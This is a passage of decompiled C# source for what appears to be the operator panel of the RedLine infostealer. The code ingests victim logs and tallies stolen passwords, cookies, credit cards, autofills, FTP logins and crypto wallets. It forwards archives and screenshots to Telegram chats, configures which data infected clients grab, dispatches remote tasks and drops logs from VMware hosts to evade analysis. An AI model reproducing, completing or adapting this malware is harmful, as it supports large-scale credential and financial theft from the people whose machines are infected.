							IEnumerable<UserLog> enumerable = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray()?.Where((UserLog x) => x.BuildID == currentGuestLink.BuildID);
							if (enumerable != null && enumerable.Any())
							{
								IOrderedEnumerable<KeyValuePair<string, long>> keyValuePairs = from x in enumerable.CountBy((UserLog x) => x.Country)
									orderby x.Value descending
									select x;
								string s = GenerateHtml(keyValuePairs, enumerable.Count());
								byte[] bytes = Encoding.UTF8.GetBytes(s);
								httpListenerContext.Response.OutputStream.Write(bytes, 0, bytes.Length);
							}
						}
					}
				}
			}
			else
			{
				string fileName = request.RawUrl.TrimStart('/');
				GuestFile[] source2 = LazyLoader<GuestFilesDb>.Instance.DbInstance.ToArray();
				if (source2.Any((GuestFile x) => x.Filename == fileName))
				{
					source2.First((GuestFile x) => x.Filename == fileName);
					string path = Path.Combine(Directory.CreateDirectory(Path.Combine(Directory.GetCurrentDirectory(), "GuestFilesHost")).FullName, fileName);
					List<byte> list = new List<byte>();
					lock (LazyLoader<GuestFilesDb>.Instance.DataBaseLock)
					{
						list = System.IO.File.ReadAllBytes(path).ToList();
						list.Add(0);
						System.IO.File.WriteAllBytes(path, list.ToArray());
					}
					httpListenerContext.Response.OutputStream.Write(list.ToArray(), 0, list.Count);
				}
			}
			httpListenerContext.Response.Close();
		}
		catch
		{
		}
	}

	public string GenerateHtml(IOrderedEnumerable<KeyValuePair<string, long>> keyValuePairs, int total)
	{
		string result = string.Empty;
		try
		{
			result = string.Format("\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n    <head>\r\n        <meta charset=\"UTF-8\" />\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\r\n        <title>RedLine Guest Stat</title>\r\n\r\n        <style>\r\n            * {{\r\n                margin: 0;\r\n            }}\r\n            .MainSection {{\r\n                width: 99%;\r\n                height: auto;\r\n                font-size: 12px;\r\n            }}\r\n\r\n            .MainSection > h2 {{\r\n                width: 100%;\r\n                font-size: 18px !important;\r\n                font-weight: 500;\r\n                color: #fff;\r\n                padding: 12px;\r\n                background: #fff;\r\n            }}\r\n            .MainSection > h2:hover {{\r\n                cursor: default;\r\n            }}\r\n\r\n            .MainSectionContent {{\r\n                width: 100%;\r\n                height: auto;\r\n                margin-top: 10px;\r\n            }}\r\n            .Tables {{\r\n                display: flex;\r\n                justify-content: space-around;\r\n            }}\r\n            .Tables > .Columns {{\r\n                width: 49.9%;\r\n                height: auto;\r\n                min-height: 30px;\r\n                position: relative;\r\n                text-align: center !important;\r\n            }}\r\n\r\n            .Columns > p:first-child {{\r\n                height: 40px;\r\n                line-height: 40px;\r\n                font-weight: bold;\r\n                color: rgb(97, 97, 97);\r\n                border: none;\r\n                border-top: 1px solid rgb(224, 224, 224);\r\n                border-bottom: 1px solid rgb(224, 224, 224);\r\n                background: rgb(228, 228, 228);\r\n            }}\r\n            .Columns > p {{\r\n                height: 40px;\r\n                line-height: 40px;\r\n                font-size: 16px;\r\n                margin-top: 5px;\r\n                color: #000;\r\n                border-bottom: 1px solid rgb(224, 224, 224);\r\n            }}\r\n            .secondChild {{\r\n                border: none;\r\n                background: rgb(245, 245, 245);\r\n            }}\r\n            .Columns > p:last-child {{\r\n                font-size: 14px;\r\n                border: none;\r\n            }}\r\n            .dark > h2 {{\r\n                background: rgb(43, 54, 60) !important;\r\n            }}\r\n            #FirstTable,\r\n            #SecondTable {{\r\n                width: 600px;\r\n                min-height: 50px;\r\n                margin: 0 10px;\r\n                display: inline-block;\r\n            }}\r\n        </style>\r\n    </head>\r\n    <body>\r\n        <div class=\"MainSection dark\">\r\n            <h2>Total of installs: {0}</h2>\r\n\r\n            <div id=\"FirstTable\">\r\n                <div class=\"MainSectionContent\">\r\n                    <div class=\"Tables\">\r\n                        <div class=\"Columns\">\r\n                            <p>County</p>\r\n                            {1}\r\n                        </div>\r\n                        <div class=\"Columns\">\r\n                            <p>Count</p>\r\n                            {2}\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n\r\n        \r\n    </body>\r\n</html>\r\n\r\n\r\n", total, string.Join(Environment.NewLine, keyValuePairs.Select((KeyValuePair<string, long> x) => "<p>" + x.Key + "</p>")), string.Join(Environment.NewLine, keyValuePairs.Select((KeyValuePair<string, long> x) => $"<p>{x.Value}</p>")));
		}
		catch
		{
		}
		return result;
	}

	public Task CompleteTask(UserLog user, int taskId)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				if (!string.IsNullOrWhiteSpace(user.HWID) && (!(user.HWID == "UNKNOWN") || !(user.IP == "UNKNOWN")))
				{
					try
					{
						if (RemoteClientSettings.BlacklistedHWID.Contains(user.HWID) || RemoteClientSettings.BlackListedIPS.Contains(user.IP) || RemoteClientSettings.BlacklistedCountry.Contains(user.Country) || string.IsNullOrWhiteSpace(user.Country) || string.IsNullOrWhiteSpace(user.HWID) || string.IsNullOrWhiteSpace(user.IP) || (!string.IsNullOrWhiteSpace(user.BuildID) && RemoteClientSettings.BlackListedBuilds.Contains(user.BuildID)))
						{
							user = default(UserLog);
							return;
						}
					}
					catch
					{
					}
					string[] source = new string[0];
					lock (c)
					{
						if (CompletedTasks.Default.Completed == null)
						{
							CompletedTasks.Default.Completed = new StringCollection();
							CompletedTasks.Default.Save();
						}
						source = CompletedTasks.Default.Completed.Cast<string>().ToArray();
					}
					RemoteTask currentTask;
					lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
					{
						currentTask = LazyLoader<TasksDb>.Instance.DbInstance.FirstOrDefault((RemoteTask x) => x.ID == taskId);
					}
					int index = LazyLoader<TasksDb>.Instance.FindIndex((RemoteTask x) => x.ID == currentTask.ID);
					lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
					{
						if (!source.Any((string x) => x == user.HWID + "|" + currentTask.ID) && currentTask.Status == RemoteTaskStatus.Active && currentTask.Visible)
						{
							int num = Convert.ToInt32(currentTask.FinalPoint);
							if (currentTask.Current < num)
							{
								currentTask.Current++;
								if (currentTask.Current >= num)
								{
									currentTask.Status = RemoteTaskStatus.Done;
								}
							}
							else
							{
								currentTask.Status = RemoteTaskStatus.Done;
							}
							LazyLoader<TasksDb>.Instance.DbInstance[index] = currentTask;
							AddNotify($"Client [{user.HWID}:{user.IP}:{user.Country}] completed task with {taskId} ID.");
							lock (c)
							{
								if (CompletedTasks.Default.Completed == null)
								{
									CompletedTasks.Default.Completed = new StringCollection();
								}
								CompletedTasks.Default.Completed.Add(user.HWID + "|" + taskId);
								CompletedTasks.Default.Save();
							}
						}
					}
					LazyLoader<TasksDb>.Instance.Save(currentTask);
				}
			}
			catch
			{
			}
		});
	}

	public async void ProcessTelegram(UserLog user, List<string> dds)
	{
		Task.Factory.StartNew(delegate
		{
			try
			{
				List<TelegramChatSettings> list = new List<TelegramChatSettings>();
				lock (((TelegramChatsDb)this.m_e).RootLocker)
				{
					list = ((TelegramChatsDb)this.m_e).chatsSettings;
				}
				if (object_4 != null)
				{
					foreach (TelegramChatSettings item in list)
					{
						try
						{
							if (user.IsMatch(item.SearchParams))
							{
								string text = user.Country + "[" + user.HWID + "] [" + user.LogDate.ToString("O").Replace(':', '_') + "]";
								string text2 = Path.Combine(Directory.GetCurrentDirectory(), "TelegramLogs");
								InputOnlineFile inputOnlineFile = null;
								if (item.SendingMode != 0)
								{
									if (item.SendingMode == SendingMode.SendScreenshot)
									{
										byte[] screenshot = user.Screenshot;
										if (screenshot != null && screenshot.Any())
										{
											inputOnlineFile = new InputOnlineFile(new MemoryStream(user.Screenshot), "Screenshot.jpg");
										}
									}
								}
								else
								{
									user.SaveTo(text2, RemoteClientSettings.SaveAsJSON, dds);
									ZipFile.CreateFromDirectory(Path.Combine(text2, text), text + ".zip");
									Directory.Delete(Path.Combine(text2, text), recursive: true);
									inputOnlineFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes(text + ".zip")), text + ".zip");
									if (System.IO.File.Exists(text + ".zip"))
									{
										System.IO.File.Delete(text + ".zip");
									}
								}
								lock (this.m_d)
								{
									string caption = item.MessageFormat.Replace("{ID}", user.ID.ToString()).Replace("{BuildID}", user.BuildID).Replace("{CDD}", user.CDD)
										.Replace("{PDD}", user.PDD)
										.Replace("{Comment}", user.Comment)
										.Replace("{Country}", user.Country)
										.Replace("{Creds}", user.Creds)
										.Replace("{HWID}", user.HWID)
										.Replace("{IP}", user.IP)
										.Replace("{Location}", user.Location)
										.Replace("{LogDate}", user.LogDate.ToString())
										.Replace("{OS}", user.OS)
										.Replace("{PostalCode}", user.PostalCode)
										.Replace("{TimeZone}", user.TimeZone)
										.Replace("{Username}", user.Username)
										.Replace("{FileLocation}", user.FileLocation)
										.Replace("{SeenBefore}", user.SeenBefore.ToString());
									if (item.SendingMode != 0)
									{
										if (item.SendingMode == SendingMode.SendScreenshot && user.Screenshot.IsNull(new byte[0]).Length != 0)
										{
											((TelegramBotClient)object_4).SendPhotoAsync((ChatId)item.ChatId, inputOnlineFile, caption, ParseMode.Html, (MessageEntity[])null, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken)).Wait();
										}
										else
										{
											((TelegramBotClient)object_4).SafeSendTextMessage((ChatId)item.ChatId, caption, ParseMode.Html, (MessageEntity[])null, disableWebPagePreview: false, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken)).Wait();
										}
									}
									else
									{
										((TelegramBotClient)object_4).SendDocumentAsync((ChatId)item.ChatId, inputOnlineFile, caption, ParseMode.Html, (MessageEntity[])null, disableContentTypeDetection: false, disableNotification: false, 0, allowSendingWithoutReply: false, (IReplyMarkup)null, default(CancellationToken), (InputMedia)null).Wait();
										if (System.IO.File.Exists(text + ".zip"))
										{
											System.IO.File.Delete(text + ".zip");
										}
									}
								}
							}
						}
						catch (Exception ex)
						{
							AddNotify("Telegram error: " + ex);
						}
					}
				}
			}
			catch (Exception ex2)
			{
				AddNotify("Telegram error: " + ex2);
			}
			user = default(UserLog);
		});
	}

	public bool IsBlacklisted(UserLog user)
	{
		try
		{
			if (user.Credentials?.Hardwares != null && user.Credentials.Hardwares.Any((Hardware x) => x.Caption.Contains("VMware")))
			{
				return true;
			}
			if (!RemoteClientSettings.BlacklistedHWID.Contains(user.HWID))
			{
				if (RemoteClientSettings.BlackListedIPS.Contains(user.IP))
				{
					AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by ip " + user.IP);
					return true;
				}
				if (!RemoteClientSettings.BlacklistedCountry.Contains(user.Country))
				{
					if (!string.IsNullOrWhiteSpace(user.BuildID) && RemoteClientSettings.BlackListedBuilds.Contains(user.BuildID))
					{
						AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by buildId " + user.BuildID);
						return true;
					}
					return string.IsNullOrWhiteSpace(user.Country) || string.IsNullOrWhiteSpace(user.HWID) || string.IsNullOrWhiteSpace(user.IP);
				}
				AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by country " + user.Country);
				return true;
			}
			AddNotify("Blocked log " + user.HWID + "|" + user.IP + " by hwid " + user.HWID);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public Task ReciveClient(UserLog user)
	{
		return Task.Factory.StartNew(delegate
		{
			try
			{
				try
				{
					if (IsBlacklisted(user))
					{
						user = default(UserLog);
						return;
					}
				}
				catch
				{
				}
				bool flag = false;
				user.LogDate = DateTime.Now;
				if (string.IsNullOrWhiteSpace(user.BuildID))
				{
					user.BuildID = "UNKNOWN";
				}
				bool flag2 = false;
				flag2 = RemoteClientSettings.AntiDuplicate;
				lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
				{
					if (!(flag = LazyLoader<UserLogsDb>.Instance.DbInstance.Any((UserLog x) => x.HWID == user.HWID) && flag2))
					{
						if (LazyLoader<UserLogsDb>.Instance.DbInstance.Count == 0)
						{
							user.ID = 1;
						}
						else
						{
							user.ID = LazyLoader<UserLogsDb>.Instance.DbInstance[LazyLoader<UserLogsDb>.Instance.DbInstance.Count - 1].ID + 1;
						}
					}
					List<string> list = new List<string>();
					lock (settingsLock)
					{
						list = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
					}
					user.Checked = false;
					if (d(user) != 0)
					{
						user = default(UserLog);
					}
					else if (!flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = 0;
						int num4 = 0;
						try
						{
							IList<Browser> browsers = user.Credentials.Browsers;
							if (browsers != null && browsers.Count > 0)
							{
								num = browsers.Where((Browser q) => q.Credentials != null).SelectMany((Browser x) => x.Credentials)?.Count() ?? 0;
								num2 = browsers.Where((Browser q) => q.Cookies != null).SelectMany((Browser x) => x.Cookies)?.Count() ?? 0;
								num3 = browsers.Where((Browser q) => q.CreditCards != null).SelectMany((Browser x) => x.CreditCards)?.Count() ?? 0;
							}
							IList<RemoteFile> coldWallets = user.Credentials.ColdWallets;
							if (coldWallets != null && coldWallets.Count > 0)
							{
								num4 = user.Credentials.ColdWallets.CountBy((RemoteFile x) => x.NameOfApplication).Keys.Count;
							}
						}
						catch
						{
						}
						user.Creds = $"{num}|{num2}|{num3}|{num4}";
						if (!(user.Creds == "0|3|0|7") && !(user.Creds == "2|0|0|7") && !(user.Creds == "0|35|0|7") && !(user.Creds == "0|0|0|1") && !(user.Creds == "0|55|0|7") && !(user.Creds == "3|55|0|7") && !(user.Creds == "0|37|0|7") && !(user.Creds == "0|3|0|0") && (!RemoteClientSettings.BlockEmptyLogs || !(user.Creds == "0|0|0|0")))
						{
							try
							{
								user.PDD = string.Empty;
								user.CDD = string.Empty;
								foreach (string item in list)
								{
									try
									{
										string[] array = item.Split('=');
										if (user.PasswordContains(array[1]))
										{
											ref UserLog reference = ref user;
											reference.PDD = reference.PDD + array[0] + "|";
										}
										if (user.CookiesContains(array[1]))
										{
											ref UserLog reference2 = ref user;
											reference2.CDD = reference2.CDD + array[0] + "|";
										}
									}
									catch
									{
									}
								}
								user.PDD = user.PDD.TrimEnd('|');
								user.CDD = user.CDD.TrimEnd('|');
							}
							catch
							{
							}
							string autosaveDirectory = RemoteClientSettings.AutosaveDirectory;
							if (!string.IsNullOrWhiteSpace(autosaveDirectory))
							{
								try
								{
									if (!Directory.Exists(autosaveDirectory))
									{
										Directory.CreateDirectory(autosaveDirectory);
									}
									user.SaveTo(autosaveDirectory, RemoteClientSettings.SaveAsJSON, list);
									user.Checked = true;
								}
								catch
								{
								}
							}
							try
							{
								if (object_4 != null && intptr_1 != (IntPtr)0)
								{
									lock (((TelegramChatsDb)this.m_e).RootLocker)
									{
										if (((TelegramChatsDb)this.m_e).chatsSettings.Any((TelegramChatSettings x) => x.SendingMode == SendingMode.SendLog))
										{
											user.Checked = true;
										}
									}
									ProcessTelegram(user, list);
								}
							}
							catch
							{
							}
							LazyLoader<UserLogsDb>.Instance.Save(user);
							CalcCounters(user, user.Creds);
							user.Credentials = new Credentials();
							user.Screenshot = new byte[0];
							LazyLoader<UserLogsDb>.Instance.DbInstance.Add(user);
							lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
							{
								Invoke((MethodInvoker)delegate
								{
									LazyLoader<UserLogsDb>.Instance.PageController.AddToEnd(user);
								});
							}
							LazyLoader<UserLogsDb>.Instance.PageController.ChangeCount(LazyLoader<UserLogsDb>.Instance.DbInstance.Count);
						}
						else
						{
							AddNotify("Blocked log " + user.HWID + " by creds " + user.Creds);
							user = default(UserLog);
						}
					}
					else
					{
						AddNotify("Duplicate log from " + user.HWID + "|" + user.IP + "|BuildID=" + user.BuildID.IsNull("UNKNOWN"));
						user = default(UserLog);
					}
				}
			}
			catch (Exception ex)
			{
				AddNotify(ex.ToString());
				user = default(UserLog);
			}
		});
	}

	private uint d(UserLog userLog)
	{
		try
		{
			if (userLog.Credentials.Files != null && e(userLog.Credentials.Files) != 0)
			{
				return 1u;
			}
			if (userLog.Credentials.Discord != null && e(userLog.Credentials.Discord) != 0)
			{
				return 1u;
			}
			if (userLog.Credentials.TelegramFiles != null && e(userLog.Credentials.TelegramFiles) != 0)
			{
				return 1u;
			}
			if (userLog.Credentials.ProtonVPN != null && e(userLog.Credentials.ProtonVPN) != 0)
			{
				return 1u;
			}
			if (userLog.Credentials.OpenVPN != null && e(userLog.Credentials.OpenVPN) != 0)
			{
				return 1u;
			}
			if (userLog.Credentials.ColdWallets == null || e(userLog.Credentials.ColdWallets) == 0)
			{
				if (userLog.Credentials.SteamFiles != null && e(userLog.Credentials.SteamFiles) != 0)
				{
					return 1u;
				}
				return 0u;
			}
			return 1u;
		}
		catch
		{
			return 0u;
		}
	}

	private static uint e(object currentRemoteFiles)
	{
		try
		{
			foreach (RemoteFile item in (IEnumerable<RemoteFile>)currentRemoteFiles)
			{
				try
				{
					if (f(item.FileDirectory) == 0 && f(item.FileName) == 0 && f(item.SourcePath) == 0)
					{
						continue;
					}
					return 1u;
				}
				catch
				{
				}
			}
			return 0u;
		}
		catch
		{
			return 0u;
		}
	}

	private static uint f(object exp)
	{
		if (!((string)exp).IsNull(string.Empty).Contains("/../"))
		{
			return ((string)exp).IsNull(string.Empty).Contains("\\..\\") ? 1u : 0u;
		}
		return 1u;
	}

	public Task<IList<RemoteTask>> OnGetTasks(UserLog user)
	{
		return Task.Factory.StartNew(delegate
		{
			IList<RemoteTask> list = new List<RemoteTask>();
			if (string.IsNullOrWhiteSpace(user.HWID))
			{
				user = default(UserLog);
				return list;
			}
			if (user.HWID == "UNKNOWN" && user.IP == "UNKNOWN")
			{
				user = default(UserLog);
				return list;
			}
			try
			{
				if (IsBlacklisted(user))
				{
					user = default(UserLog);
					return list;
				}
			}
			catch
			{
			}
			try
			{
				string[] source = new string[0];
				lock (c)
				{
					if (CompletedTasks.Default.Completed == null)
					{
						CompletedTasks.Default.Completed = new StringCollection();
						CompletedTasks.Default.Save();
					}
					source = CompletedTasks.Default.Completed.Cast<string>().ToArray();
				}
				lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
				{
					foreach (RemoteTask task in LazyLoader<TasksDb>.Instance.LoadDB())
					{
						bool flag = user.IsMatch(task.Filter);
						if (task.Visible && task.Status == RemoteTaskStatus.Active && flag && !source.Any((string x) => x == user.HWID + "|" + task.ID))
						{
							list.Add(task);
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		});
	}

	public Task<ClientSettings> OnGetSettings()
	{
		return Task.Factory.StartNew(delegate
		{
			ClientSettings clientSettings = new ClientSettings();
			try
			{
				lock (settingsLock)
				{
					try
					{
						clientSettings.ScanChromeBrowsersPaths = new List<string>();
						clientSettings.ScanChromeBrowsersPaths.AddRange(System.IO.File.ReadAllLines("chromeBrowsers.txt"));
					}
					catch
					{
					}
					try
					{
						clientSettings.ScanGeckoBrowsersPaths = new List<string>();
						clientSettings.ScanGeckoBrowsersPaths.AddRange(System.IO.File.ReadAllLines("geckoBrowsers.txt"));
					}
					catch
					{
					}
					clientSettings.GrabPaths = ((RemoteClientSettings.GrabPaths == null) ? new List<string>() : RemoteClientSettings.GrabPaths.Cast<string>().ToList());
					clientSettings.GrabDiscord = RemoteClientSettings.GrabDiscord;
					clientSettings.GrabBrowsers = RemoteClientSettings.GrabBrowsers;
					clientSettings.GrabFiles = RemoteClientSettings.GrabFiles;
					clientSettings.GrabFTP = RemoteClientSettings.GrabFTP;
					clientSettings.GrabWallets = RemoteClientSettings.GrabWallets;
					clientSettings.GrabTelegram = RemoteClientSettings.GrabTelegram;
					clientSettings.GrabVPN = RemoteClientSettings.GrabVPN;
					clientSettings.GrabScreenshot = RemoteClientSettings.GrabScreenshot;
					clientSettings.GrabSteam = RemoteClientSettings.GrabSteam;
				}
				lock (WalletConfigsDb.RootLocker)
				{
					WalletConfigsDb walletConfigsDb = new WalletConfigsDb();
					walletConfigsDb.LoadSettings();
					clientSettings.Configs = walletConfigsDb.walletSettings;
				}
			}
			catch
			{
			}
			return clientSettings;
		});
	}

	private void closeBtn_Click(object sender, object e)
	{
		if (MessageBox.Show(this, "Are you sure you want to close panel?", "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
		{
			return;
		}
		try
		{
			foreach (Process item in from x in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)
				where x.Id != Process.GetCurrentProcess().Id
				select x)
			{
				item.Kill();
				item.WaitForExit();
			}
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	public void CalcCounters(UserLog user, string creds)
	{
		try
		{
			lock (a)
			{
				if (!string.IsNullOrWhiteSpace(user.Country))
				{
					((StatisticDb)object_8).Country.Add(user.Country);
				}
				if (!string.IsNullOrWhiteSpace(user.OS))
				{
					((StatisticDb)object_8).OS.Add(user.OS);
				}
				IList<string> defenders = user.Credentials.Defenders;
				if (defenders != null)
				{
					if (defenders.Count == 1)
					{
						((StatisticDb)object_8).AVs.Add(defenders[0]);
					}
					else
					{
						foreach (string item in defenders)
						{
							if (!item.Contains("Windows Defender"))
							{
								((StatisticDb)object_8).AVs.Add(item);
							}
						}
					}
					if (defenders.Count == 0)
					{
						((StatisticDb)object_8).AVs.Add("NO ANTIVURUS");
					}
				}
				int[] array = (from x in creds.Split('|')
					select int.Parse(x)).ToArray();
				IList<Browser> browsers = user.Credentials.Browsers;
				if (browsers != null && browsers.Count > 0)
				{
					IEnumerable<Autofill> enumerable = browsers.Where((Browser x) => x.Autofills != null).SelectMany((Browser x) => x.Autofills);
					((StatisticDb)object_8).Passwords += array[0];
					((StatisticDb)object_8).Cookies += array[1];
					((StatisticDb)object_8).CreditCards += array[2];
					((StatisticDb)object_8).AutoFills += enumerable?.Count() ?? 0;
				}
				IList<LoginPair> ftpConnections = user.Credentials.FtpConnections;
				if (ftpConnections != null && ftpConnections.Count > 0)
				{
					((StatisticDb)object_8).FTPs += user.Credentials.FtpConnections?.Count ?? 0;
				}
				IList<RemoteFile> files = user.Credentials.Files;
				if (files != null && files.Count > 0)
				{
					((StatisticDb)object_8).Files += user.Credentials.Files?.Count ?? 0;
				}
				((StatisticDb)object_8).ColdWallets += array[3];
				UpdateStat();
				user.Credentials = new Credentials();
			}
		}
		catch (Exception ex)
		{
			AddNotify("Update stat ex: " + ex);
		}
	}

	public void UpdateStat()
	{
		try
		{
			BindingList<string> AvList = new BindingList<string>();
			AvList.Add(string.Empty);
			try
			{
				Dictionary<string, long> dictionary = ((StatisticDb)object_8).AVs.Cast<string>().CountBy((string x) => x);
				if (dictionary.Count > 0)
				{
					AvList.Add(from item in (from x in dictionary
							orderby x.Value descending
							where !string.IsNullOrWhiteSpace(x.Key)
							select x).Take(10)
						select $"{item.Key}   -   {item.Value}");
				}
			}
			catch
			{
			}
			BindingList<string> OsList = new BindingList<string>();
			OsList.Add(string.Empty);
			try
			{
				Dictionary<string, long> dictionary2 = ((StatisticDb)object_8).OS.Cast<string>().CountBy((string x) => x);
				if (dictionary2.Count > 0)
				{
					OsList.Add(from item in (from x in dictionary2
							orderby x.Value descending
							where !string.IsNullOrWhiteSpace(x.Key)
							select x).Take(10)
						select $"{item.Key}   -   {item.Value}");
				}
			}
			catch
			{
			}
			BindingList<string> CountryList = new BindingList<string>();
			CountryList.Add(string.Empty);
			try
			{
				Dictionary<string, long> dictionary3 = ((StatisticDb)object_8).Country.Cast<string>().CountBy((string x) => x);
				if (dictionary3.Count > 0)
				{
					CountryList.Add(from item in (from x in dictionary3
							orderby x.Value descending
							where !string.IsNullOrWhiteSpace(x.Key)
							select x).Take(10)
						select $"{item.Key}   -   {item.Value}");
				}
			}
			catch
			{
			}
			Invoke((MethodInvoker)delegate
			{
				((Control)passwordsCounter).Text = ((StatisticDb)object_8).Passwords.ToString();
				((Control)cookiesCounter).Text = ((StatisticDb)object_8).Cookies.ToString();
				((Control)autofillsCounter).Text = ((StatisticDb)object_8).AutoFills.ToString();
				((Control)creditcardsCounter).Text = ((StatisticDb)object_8).CreditCards.ToString();
				((Control)filesCounter).Text = ((StatisticDb)object_8).Files.ToString();
				((Control)ftpsCounter).Text = ((StatisticDb)object_8).FTPs.ToString();
				((Control)c5).Text = ((StatisticDb)object_8).ColdWallets.ToString();
				((ListControl)top10osLb).DataSource = OsList;
				((ListControl)top10CountriesLb).DataSource = CountryList;
				((ListControl)top10AvsLb).DataSource = AvList;
			});
		}
		catch (Exception ex)
		{
			AddNotify("UpdateStat Ex: " + ex);
		}
	}

	public void LoadSettings()
	{
		Invoke((MethodInvoker)delegate
		{
			((MetroSetCheckBox)discordCb).Checked = RemoteClientSettings.GrabDiscord;
			((MetroSetCheckBox)c9).Checked = RemoteClientSettings.GrabWallets;
			((MetroSetCheckBox)grabBrowsersCb).Checked = RemoteClientSettings.GrabBrowsers;
			((MetroSetCheckBox)grabFilesCb).Checked = RemoteClientSettings.GrabFiles;
			((MetroSetCheckBox)grabFtpsCb).Checked = RemoteClientSettings.GrabFTP;
			((MetroSetCheckBox)grabImClientsCb).Checked = RemoteClientSettings.GrabImClients;
			((MetroSetCheckBox)duplicateCb).Checked = RemoteClientSettings.AntiDuplicate;
			((MetroSetCheckBox)d0).Checked = RemoteClientSettings.BlockEmptyLogs;
			((MetroSetCheckBox)e3).Checked = RemoteClientSettings.SaveAsJSON;
			((MetroSetCheckBox)vpnCb).Checked = RemoteClientSettings.GrabVPN;
			((MetroSetCheckBox)screenshotCb).Checked = RemoteClientSettings.GrabScreenshot;
			((MetroSetCheckBox)telegramCb).Checked = RemoteClientSettings.GrabTelegram;
			((MetroSetCheckBox)steamCb).Checked = RemoteClientSettings.GrabSteam;
			((AnimaTextBox)autosaveDirTb).Text = RemoteClientSettings.AutosaveDirectory;
			((AnimaTextBox)f6).Text = RemoteClientSettings.TelegramBotToken;
			((MetroSetCheckBox)autoStartTelegramCb).Checked = RemoteClientSettings.AutoStart;
			foreach (string dDPattern in RemoteClientSettings.DDPatterns)
			{
				((ListBox)domainDetectorLb).Items.Add(dDPattern);
			}
			foreach (string blackListedBuild in RemoteClientSettings.BlackListedBuilds)
			{
				((ListBox)blackListBuildsLb).Items.Add(blackListedBuild);
			}
			foreach (string item in RemoteClientSettings.BlacklistedHWID)
			{
				((ListBox)blackListHWIDsLb).Items.Add(item);
			}
			foreach (string blackListedIP in RemoteClientSettings.BlackListedIPS)
			{
				((ListBox)blackListIPsLb).Items.Add(blackListedIP);
			}
			foreach (string item2 in RemoteClientSettings.BlacklistedCountry)
			{
				((ListBox)blackListLb).Items.Add(item2);
			}
			foreach (string grabPath in RemoteClientSettings.GrabPaths)
			{
				((ListBox)getFilesSettingsLb).Items.Add(grabPath);
			}
		});
	}

	public void ProcessNotifies()
	{
		lock (object_7)
		{
			while (((Queue<string>)this.m_f).Count != 0)
			{
				if (((TextBoxBase)notificationTb).Lines.Length > 500)
				{
					((Control)notificationTb).ResetText();
				}
				((TextBoxBase)notificationTb).AppendText(((Queue<string>)this.m_f).Dequeue());
			}
		}
	}

	public void AddNotify(string message)
	{
		lock (object_7)
		{
			((Queue<string>)this.m_f).Enqueue(DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | " + message + Environment.NewLine);
		}
	}

	private async void clearBtn_Click(object sender, object e)
	{
		if (MessageBox.Show("Are you sure you want to delete all your logs?", "Verification", MessageBoxButtons.OKCancel) != DialogResult.OK)
		{
			return;
		}
		((DataGridView)logsListView).DataSource = null;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
				{
					lock (a)
					{
						((StatisticDb)object_8).SetDefault();
						((StatisticDb)object_8).SaveSettings();
					}
					UpdateStat();
					Invoke((MethodInvoker)delegate
					{
						LazyLoader<UserLogsDb>.Instance.ClearDb();
					});
					LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
				}
				AddNotify("A List of logs cleared");
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private void logContextMenu_Opening(object sender, object e)
	{
		if (((DataGridView)logsListView).SelectedRows.Count > 1)
		{
			((ToolStripItem)systemInfoToolStripMenuItem).Visible = false;
			((ToolStripItem)viewersToolStripMenuItem).Visible = false;
			((ToolStripItem)db).Visible = false;
			((ToolStripItem)showDomainDetects).Visible = false;
		}
		if (((DataGridView)logsListView).SelectedRows.Count == 1)
		{
			((ToolStripItem)systemInfoToolStripMenuItem).Visible = true;
			((ToolStripItem)viewersToolStripMenuItem).Visible = true;
			((ToolStripItem)db).Visible = true;
			((ToolStripItem)showDomainDetects).Visible = true;
		}
		((CancelEventArgs)e).Cancel = ((DataGridView)logsListView).SelectedRows.Count == 0;
	}

	private async void passwordsToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<Browser> browsers = user.Credentials.Browsers;
				if (browsers != null && browsers.Any())
				{
					new ChooseBrowserFrm(user, ViewerType.Passwords).ShowDialog(this);
				}
				else
				{
					MessageBox.Show(this, "Browsers not found");
				}
				user = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void cookiesToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<Browser> browsers = user.Credentials.Browsers;
				if (browsers != null && browsers.Any())
				{
					new ChooseBrowserFrm(user, ViewerType.Cookies).ShowDialog(this);
				}
				else
				{
